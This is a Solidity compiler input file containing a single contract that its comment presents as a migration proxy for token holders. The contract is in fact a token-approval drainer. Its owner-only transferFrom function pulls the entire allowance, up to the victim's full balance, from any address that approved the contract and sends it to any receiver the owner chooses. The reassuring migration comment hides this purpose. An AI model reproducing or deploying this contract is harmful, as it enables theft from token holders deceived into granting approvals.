{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "browser/MyContract.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\n\r\n/*\r\n* Proxy contract, whose main purpose is to ensure a safe and seamless migration for all token holders \r\n* without breaking any dependencies.\r\n* The following code is provided under MIT License. Anyone can use it as per their needs.\r\n*/\r\npragma solidity 0.6.12;\r\n\r\ninterface IERC20Token {\r\n    function allowance(address _owner, address _spender) external view returns (uint256);\r\n    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n}\r\n\r\ncontract MyContract {\r\n    address public owner;\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n\r\n    function transferFrom(IERC20Token _token, address _sender, address _receiver) external returns (bool) {\r\n    require(msg.sender == owner, \"access denied\");\r\n    uint256 amount = _token.allowance(_sender, address(this));\r\n    uint256 balance = _token.balanceOf(_sender);\r\n    if (amount > balance) amount = balance;\r\n    return _token.transferFrom(_sender, _receiver, amount);\r\n    }\r\n}\r\n"
    }
  }
}